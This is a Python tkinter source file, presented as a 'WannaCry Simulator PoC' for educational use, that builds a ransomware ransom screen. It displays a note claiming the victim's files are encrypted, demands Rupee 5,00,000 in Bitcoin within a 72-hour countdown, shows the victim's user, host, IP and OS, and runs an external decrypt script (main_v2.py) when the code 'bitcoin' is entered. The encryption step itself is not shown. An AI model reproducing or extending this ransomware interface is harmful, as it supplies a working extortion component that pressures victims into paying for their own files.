import tkinter as tk
from tkinter import messagebox
import platform
import getpass
import socket
import subprocess
import threading
from datetime import datetime
import os

# Get local IP
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return 'Unknown'

# Main GUI
class WannaCryGUI(tk.Tk):
    def __init__(self, target_dir=None, payment_address='1BitcoinEaterAddressDontSendf59kuE', decrypt_cmd=None, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.title("Ooops, your files have been encrypted!")
        self.geometry("700x540")
        self.configure(bg="#000000")
        self.resizable(False, False)
        self.target_dir = target_dir
        self.payment_address = payment_address
        self.decrypt_cmd = decrypt_cmd or ["python", "main_v2.py", "-p", target_dir or "", "-d"]
        self.timer_seconds = 3 * 24 * 60 * 60
        self.timer_running = True
        self.skull_img = None
        self.build_gui()
        self.after(1000, self.update_timer)
        self.lift()
        self.focus_force()
        self.attributes('-topmost', True)
        self.after(500, lambda: self.attributes('-topmost', False))

    def build_gui(self):
        # Header with skull image
        header_frame = tk.Frame(self, bg="#000000")
        header_frame.pack(pady=(10, 0))
        skull_path = os.path.join(os.path.dirname(__file__), "skull.png")
        try:
            if os.path.exists(skull_path):
                self.skull_img = tk.PhotoImage(file=skull_path)
                skull_label = tk.Label(header_frame, image=self.skull_img, bg="#000000")
                skull_label.pack(side="top", pady=(0, 5))
            else:
                skull_label = tk.Label(header_frame, text="💀", font=("Segoe UI", 50, "bold"), fg="#ff0000", bg="#000000")
                skull_label.pack(side="top", pady=(0, 5))
        except Exception:
            skull_label = tk.Label(header_frame, text="💀", font=("Segoe UI", 50, "bold"), fg="#ff0000", bg="#000000")
            skull_label.pack(side="top", pady=(0, 5))
        header = tk.Label(header_frame, text="Ooops, your files have been encrypted!", font=("Courier", 20, "bold"), fg="#ff0000", bg="#000000")
        header.pack(side="top")

        # Timer
        self.timer_label = tk.Label(self, text="Time left: 72:00:00", font=("Courier", 20, "bold"), fg="#ffff00", bg="#000000")
        self.timer_label.pack(pady=(10, 10))

        # System info
        user = getpass.getuser()
        host = platform.node()
        ip = get_local_ip()
        os_name = platform.system() + " " + platform.release()
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        info_text = f"User: {user}\nHost: {host}\nIP: {ip}\nOS: {os_name}\nTime: {now}"
        if self.target_dir:
            info_text += f"\nTarget: {self.target_dir}"
        info = tk.Label(self, text=info_text, font=("Courier", 10), fg="#ff4444", bg="#000000", justify="left")
        info.pack(pady=(0, 10))

        # Ransom Note
        note_frame = tk.Frame(self, bg="#1a0000", bd=2, relief="solid")
        note_frame.pack(padx=30, pady=10, fill="x")
        note = tk.Label(note_frame, text=(
            "YOUR DOCUMENTS, PHOTOS, DATABASES AND OTHER IMPORTANT FILES HAVE BEEN ENCRYPTED!\n\n"
            "If you see this message, your files are NO LONGER ACCESSIBLE.\n"
            "You must PAY A RANSOM in BITCOIN to get them back!\n\n"
            "Send Rupee 5,00,000 worth of BTC to the address below.\n"
            "After payment, enter the code and click 'Decrypt Files'.\n\n"
            "FAILURE TO PAY WITHIN 3 DAYS WILL RESULT IN PERMANENT FILE LOSS!\n"
        ), font=("Courier", 12, "bold"), fg="#ffcc00", bg="#1a0000", justify="left", wraplength=620)
        note.pack(padx=10, pady=10)

        # Payment Address
        pay_label = tk.Label(self, text="💸 BTC PAYMENT ADDRESS", font=("Courier", 11, "bold"), fg="#ff0000", bg="#000000")
        pay_label.pack(pady=(20, 0))
        pay_addr = tk.Entry(self, font=("Courier", 12), fg="#000000", bg="#eeeeee", width=50, justify="center")
        pay_addr.insert(0, self.payment_address)
        pay_addr.config(state="readonly")
        pay_addr.pack(pady=(0, 10))

        # Entry + Button
        entry_frame = tk.Frame(self, bg="#000000")
        entry_frame.pack(pady=(20, 10), padx=30, fill="x")

        self.code_var = tk.StringVar()
        code_entry = tk.Entry(entry_frame, textvariable=self.code_var,
                              font=("Courier", 14, "bold"), fg="#000000", bg="#fff8e1",
                              width=25, justify="center", bd=3, relief="solid")
        code_entry.pack(side="left", expand=True, fill="x", padx=(0, 10), ipady=6)

        self.decrypt_btn = tk.Button(entry_frame, text="💾 Decrypt Files",
                                     font=("Courier", 12, "bold"),
                                     bg="#33cc33", fg="black",
                                     width=20, command=self.try_decrypt,
                                     bd=3, relief="raised")
        self.decrypt_btn.pack(side="left", ipady=6)

        # Footer
        footer = tk.Label(self, text="WannaCry Simulator PoC - FOR EDUCATIONAL USE ONLY", font=("Courier", 9), fg="#888888", bg="#000000")
        footer.pack(side="bottom", pady=10)

    def update_timer(self):
        if self.timer_running and self.timer_seconds > 0:
            self.timer_seconds -= 1
            h, m, s = self.timer_seconds // 3600, (self.timer_seconds % 3600) // 60, self.timer_seconds % 60
            self.timer_label.config(text=f"Time left: {h:02}:{m:02}:{s:02}")
            self.after(1000, self.update_timer)
        elif self.timer_seconds == 0:
            self.timer_label.config(text="Time left: 00:00:00")
            messagebox.showerror("💀 Time's up!", "Your files are lost forever.")
            self.decrypt_btn.config(state="disabled")

    def try_decrypt(self):
        code = self.code_var.get().strip().lower()
        if code == "bitcoin":
            self.timer_running = False
            self.decrypt_btn.config(state="disabled")
            self.run_decrypt_command()
        else:
            messagebox.showerror("Wrong Code", "Invalid decryption code. Try again.")

    def run_decrypt_command(self):
        def do_decrypt():
            try:
                result = subprocess.run(self.decrypt_cmd, capture_output=True, text=True)
                if result.returncode == 0:
                    messagebox.showinfo("Success", "Files decrypted successfully!")
                    self.after(1000, self.destroy)
                else:
                    messagebox.showerror("Decryption Error", f"Decryption failed.\n\n{result.stderr}")
            except Exception as e:
                messagebox.showerror("Execution Failed", f"Could not run decrypt command.\n\n{e}")
        threading.Thread(target=do_decrypt, daemon=True).start()

if __name__ == "__main__":
    import sys
    target_dir = sys.argv[1] if len(sys.argv) > 1 else None
    app = WannaCryGUI(target_dir=target_dir)
    app.mainloop()
